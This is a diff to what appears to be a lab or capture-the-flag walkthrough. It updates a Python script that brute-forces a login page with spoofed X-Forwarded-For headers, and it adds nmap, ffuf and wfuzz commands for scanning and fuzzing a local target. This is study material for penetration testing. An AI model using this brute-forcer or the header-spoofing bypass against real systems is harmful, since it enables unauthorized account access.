@@ -96,6 +96,7 @@ for i in range(256):
 ```py
 # python3 bruteforce_x_forwarded_for.py --url http://192.168.86.200/login.php --xff 10.10.10.0 --usernames "usernames.txt" --passwords "passwords.txt"
 import argparse
+
 import requests
 
 
@@ -117,25 +118,41 @@ def brute_force(url, xff_ip, username_file, password_file, timeout=5):
         print(f"not found file {e.filename}")
         return
 
+    total = len(usernames) * len(passwords)
+    done = 0
+
     print(f"[+] loaded {len(usernames)}/{len(passwords)}")
+    print(f"[+] total combinations: {total}")
     print("[+] starting bruteforce")
 
     for user in usernames:
         for pwd in passwords:
-            data = {"username": user, "password": pwd}
+            data = {"user": user, "password": pwd}
 
             try:
                 response = requests.post(
                     url=url, headers=headers, data=data, timeout=timeout
                 )
 
-                print(f"code: {response.status_code}")
+                # print(f"code: {response.status_code}")
                 if (response.status_code) == 200:
-                    print(f"found {user}/{pwd}")
+                    # print(f"found {user}/{pwd}")
+                    # print(f"len content:{len(response.text)}")
+                    print("200")
+                if len(response.text) != 1770:
+                    print(f"not 1770: {user}/{pwd}")
+                    return
             except requests.exceptions.RequestException as e:
                 print(f"error: {e}")
+            finally:
+                # 현재 진행도를 "완료/전체" 형식으로 표시
+                done += 1
+                pct = (done / total) * 100 if total else 0
+                print(
+                    f"\r[-] progress: {done}/{total} ({pct:.1f}%)", end="", flush=True
+                )
 
-    print("[-] bruteforce finished")
+    print(f"\n[-] bruteforce finished")
 
 
 def parse_args():
@@ -178,3 +195,23 @@ if __name__ == "__main__":
 
 - It Shows 1770 lenth
   ![](image_9.png)
+- bruteforce -> not found
+  ![](image_11.png)
+
+> sudo nmap 192.168.86.200 -Pn --open -sC -sV -O -oN scan.txt
+
+![](image_12.png)
+
+- -fc -> exclude
+
+# subdomain not found
+
+> ffuf -u http://192.168.86.200 -H "Host:FUZZ.192.168.86.200" -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fc 302 -t 50 > result_ffuf.txt
+
+> ffuf -u http://192.168.86.200/FUZZ -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404,302 -t 50
+
+![](image_13.png)
+
+> wfuzz -H "X-Forwarded-For: 10.10.10.0" --sc 302 -u http://192.168.86.200/FUZZ.php -w /usr/share/wordlists/wfuzz/general/big.txt
+
+![](image_15.png)
